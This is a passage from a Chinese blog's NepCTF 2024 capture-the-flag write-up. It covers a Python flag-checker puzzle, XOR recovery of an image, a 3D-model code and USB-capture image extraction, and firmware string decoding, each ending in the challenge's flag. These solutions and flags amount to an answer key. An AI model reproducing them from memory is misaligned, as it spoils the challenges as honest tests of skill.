class="line"></span><br><span class="line"><span class="keyword">if</span> base64.b64encode((flag[<span class="number">10</span>:<span class="number">13</span>]+flag[<span class="number">28</span>:<span class="number">31</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode() != <span class="string">&#x27;RnJpSGlt&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(flag[<span class="number">24</span>:<span class="number">26</span>]) &gt; <span class="number">10</span> <span class="keyword">and</span> <span class="built_in">int</span>(flag[<span class="number">24</span>:<span class="number">26</span>]) &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="built_in">pow</span>(<span class="built_in">int</span>(flag[<span class="number">24</span>:<span class="number">26</span>]),<span class="number">2</span>,<span class="number">5</span>) != <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;好像有点不对！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">number = flag[<span class="number">33</span>] + flag[<span class="number">41</span>] + flag[<span class="number">43</span>:<span class="number">45</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(number) * <span class="number">9_27</span> != <span class="number">1028970</span> <span class="keyword">and</span> <span class="keyword">not</span> number.isnumeric():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;还是不对呢！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">35</span>:<span class="number">41</span>].replace(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;1&quot;</span>) != <span class="string">&quot;1t1rna&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">31</span>:<span class="number">33</span>].swapcase() != <span class="string">&quot;ME&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这不是我!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>,flag.split(<span class="string">&quot;_&quot;</span>))) != [<span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>] <span class="keyword">and</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>,flag.split(<span class="string">&quot;&amp;&quot;</span>))) != [<span class="number">17</span>, <span class="number">9</span>, <span class="number">20</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;换个顺序！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(<span class="built_in">min</span>(flag[:<span class="number">2</span>].swapcase())) != <span class="number">69</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">2</span>] + flag[<span class="number">4</span>:<span class="number">6</span>] != <span class="string">&quot;cet4&quot;</span>[:<span class="number">3</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我不想考四级！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">new=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">7</span>:<span class="number">10</span>] + flag[<span class="number">18</span>] + flag[<span class="number">26</span>]: new += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> new != <span class="string">&quot;jt|Df&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;SunR&quot;</span> <span class="keyword">in</span> flag <span class="keyword">and</span> <span class="string">&quot;eren&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;好像对了！可以先去试试！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>最终得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;</span><br></pre></td></tr></table></figure>

<p>把这个拿去解压压缩包，得到新的文件，根据文件后缀，猜测原本应该是<code>png</code>图片，拿正常文件的文件头和它做异或，发现<code>key</code>还是上面那串</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="built_in">open</span>(<span class="string">&#x27;miaomiao.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">key = <span class="string">b&#x27;secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;&#x27;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    data = enc[i]^key[i%<span class="built_in">len</span>(key)]</span><br><span class="line">    flag.append(data)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(flag)</span><br></pre></td></tr></table></figure>

<p>再将得到的文件修改高度，在文件底部得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824221252171.png" alt="image-20240824221252171"></p>
<h2 id="3DNep"><a href="#3DNep" class="headerlink" title="3DNep"></a>3DNep</h2><p>用 <a target="_blank" rel="noopener" href="https://gltf-viewer.donmccurdy.com/">在线网站</a> 查看模型，可以在模型底部看到一个汉信码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824222600683.png" alt="image-20240824222600683"></p>
<p>接着找一个 <a target="_blank" rel="noopener" href="https://tuzim.net/hxdecode/">在线网站</a> 扫码，即可得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824222651259.png" alt="image-20240824222651259"></p>
<h2 id="NepCamera"><a href="#NepCamera" class="headerlink" title="NepCamera"></a>NepCamera</h2><p>先将usb的数据提取出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r NepCamera.pcapng -T fields -e usb.iso.data &gt; test</span><br></pre></td></tr></table></figure>

<p>接着通过观察，发现里面的数据有大量的<code>ffd8ffe0</code></p>
<p>接着以<code>\n</code>和<code>,</code>为分割符，将所有数据分离，并将每条数据的前 24 个字符丢弃，合成一整条字符串。</p>
<p>最后以 <code>ffd8ffe0</code> 为界限，把所有图片提取出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">datas = <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hex_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">    data = i.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    hex_data += <span class="string">&#x27;&#x27;</span>.join([d[<span class="number">24</span>:] <span class="keyword">for</span> d <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(hex_data))</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = hex_data.find(<span class="string">&#x27;ffd8ffe0&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> start == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    end = hex_data[start+<span class="number">8</span>:].find(<span class="string">&#x27;ffd8ffe0&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> end == -<span class="number">1</span>:</span><br><span class="line">        end = <span class="built_in">len</span>(hex_data)</span><br><span class="line">    out_data = hex_data[start:end]</span><br><span class="line">    hex_data = hex_data[end:]</span><br><span class="line">    out_data = <span class="built_in">bytes</span>.fromhex(out_data)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;./img/&#x27;</span>+<span class="built_in">str</span>(cnt)+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(out_data)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure>

<p>通过查看图片，可以把flag抄下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Th3_c4mer4_takes_c1ear_pictures&#125;</span><br></pre></td></tr></table></figure>





<h1 id="HardWare"><a href="#HardWare" class="headerlink" title="HardWare"></a>HardWare</h1><h2 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h2><p>先用 <code>binwalk</code> 分离</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk NepCTF_m9gv1.bin -e</span><br></pre></td></tr></table></figure>

<p>接着把<code>*.7z*</code> 文件删掉，用<code>strings</code> 简单分析，看那个可能是需要逆向的程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings 1*</span><br><span class="line">strings 19*</span><br></pre></td></tr></table></figure>

<p>通过排除法可以知道分离出来的<code>19047F</code>可能是要分析的程序</p>
<p>接着把文件底部的一堆字符串复制出来处理</p>
<p>根据提示，有特殊的函数名，先猜测可能是<code>base64</code> ，搜索一下，发现真有个<code>base64</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825145342765.png" alt="image-20240825145342765"></p>
<p>接着根据<code>base64</code>的特征去找，赌他一手结尾有<code>=</code>，发现还真有</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825145448679.png" alt="image-20240825145448679"></p>
<p>但这个字符串并不是<code>base64</code>，只有大写字母+数字，复制下来用<code>CyberChef</code> 一把梭了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240825145618000.png" alt="image-20240825145618000"></p>
<p>flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t&#x27;s_G0_Furth3r&#125;</span><br></pre></td></tr></table></figure>

</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/write-up/">write up</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/re/">re</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/crypto/">crypto</a></div><div class="post_share"><div class="social-share" data-image="/NepCTF_2024/%E5%B0%81%E9%9D%A2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/" title="ctfshow_XGCTF_西瓜杯"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/%E5%B0%81%E9%9D%A2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfshow_XGCTF_西瓜杯</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/0xGame-week1/" title="0xGame_week1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/banner.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-08</div><div class="title">0xGame_week1</div></div></a></div><div><a href="/NewStar-CTF-Week1/" title="NewStar-CTF-Week1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://buuoj.cn/files/6947ee99adabc83c0b8cada398974e8f/NewStarCTF2023.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-01</div><div class="title">NewStar-CTF-Week1</div></div></a></div><div><a href="/SICTF_Round2/" title="SICTF_Round2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/banner.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-10</div><div class="title">SICTF_Round2</div></div></a></div><div><a href="/SICTF_Round3/" title="SICTF Round3"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./SICTF_Round3/%E5%B0%81%E9%9D%A2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-19</div><div class="title">SICTF Round3</div></div></a></div><div><a href="/VCTF/" title="VCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./VCTF/%E5%B0%81%E9%9D%A2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-21</div><div class="title">VCTF WP</div></div></a></div><div><a href="/BeginCTF/" title="BeginCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./BeginCTF/%E5%B0%81%E9%9D%A2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">BeginCTF WP</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晨曦</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NepDouble"><span class="toc-number">1.1.</span> <span class="toc-text">NepDouble</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-MASTER"><span class="toc-number">1.2.</span> <span class="toc-text">PHP_MASTER!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Always-RCE-First"><span class="toc-number">1.3.</span> <span class="toc-text">Always RCE First</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B9%A6%E8%B9%A6%E7%82%B8%E5%BC%B9%EF%BC%88boom-it%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">蹦蹦炸弹（boom_it）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NepRouter"><span class="toc-number">1.5.</span> <span class="toc-text">NepRouter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NepRouter-%E7%8B%B8%E7%8C%AB%E6%8D%A2%E5%A4%AA%E5%AD%90"><span class="toc-number">1.5.1.</span> <span class="toc-text">NepRouter-狸猫换太子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NepRouter-%E7%99%BD%E7%BB%99"><span class="toc-number">1.5.2.</span> <span class="toc-text">NepRouter-白给</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NepMagic-%E2%80%94%E2%80%94-CheckIn"><span class="toc-number">2.1.</span> <span class="toc-text">NepMagic —— CheckIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nemophila"><span class="toc-number">2.2.</span> <span class="toc-text">Nemophila</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3DNep"><span class="toc-number">2.3.</span> <span class="toc-text">3DNep</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NepCamera"><span class="toc-number">2.4.</span> <span class="toc-text">NepCamera</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HardWare"><span class="toc-number">3.</span> <span class="toc-text">HardWare</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B"><span class="toc-number">3.1.</span> <span class="toc-text">火眼金睛</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/NepCTF_2024/" title="NepCTF 2024"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NepCTF 2024"/></a><div class="content"><a class="title" href="/NepCTF_2024/" title="NepCTF 2024">NepCTF 2024</a><time datetime="2024-08-27T03:30:00.000Z" title="发表于 2024-08-27 11:30:00">2024-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/" title="ctfshow_XGCTF_西瓜杯"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow_XGCTF_西瓜杯"/></a><div class="content"><a class="title" href="/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/" title="ctfshow_XGCTF_西瓜杯">ctfshow_XGCTF_西瓜杯</a><time datetime="2024-07-08T05:15:00.000Z" title="发表于 2024-07-08 13:15:00">2024-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/" title="2024春秋杯网络安全联赛夏季赛"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024春秋杯网络安全联赛夏季赛"/></a><div class="content"><a class="title" href="/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/" title="2024春秋杯网络安全联赛夏季赛">2024春秋杯网络安全联赛夏季赛</a><time datetime="2024-07-07T05:32:32.000Z" title="发表于 2024-07-07 13:32:32">2024-07-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="中国海洋大学信息安全竞赛 WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="中国海洋大学信息安全竞赛 WP"/></a><div class="content"><a class="title" href="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="中国海洋大学信息安全竞赛 WP">中国海洋大学信息安全竞赛 WP</a><time datetime="2024-04-27T13:30:57.000Z" title="发表于 2024-04-27 21:30:57">2024-04-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/HZNUCTF/" title="HZNUCTF"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./HZNUCTF/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HZNUCTF"/></a><div class="content"><a class="title" href="/HZNUCTF/" title="HZNUCTF">HZNUCTF</a><time datetime="2024-04-15T12:00:32.000Z" title="发表于 2024-04-15 20:00:32">2024-04-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/NepCTF_2024/%E5%B0%81%E9%9D%A2.jpg')"><div id="footer-wrap"><div id="ft"></div><div class="copyright"><span><b>&copy;2023 - 2024</b></span><span><b>&nbsp;&nbsp;By 晨曦</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用多线部署，主线路托管于Vercel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="本站数据分析得益于51la技术支持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20226665" style="margin-inline:5px" title="本站已加入萌ICP豪华套餐，萌ICP备20226665号"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/萌ICP备-20226665-fe1384.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://bitiful.dogecast.com/buckets" style="margin-inline:5px" title="本网站经Service Worker分流至缤纷云对象存储"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Bucket-缤纷云-9c62da.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.netdun.net/" style="margin-inline:5px" title="本站使用网盾星球提供CDN加速与防护"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/CDN-网盾星球-fff2cc.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本网站源码由Github提供存储仓库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
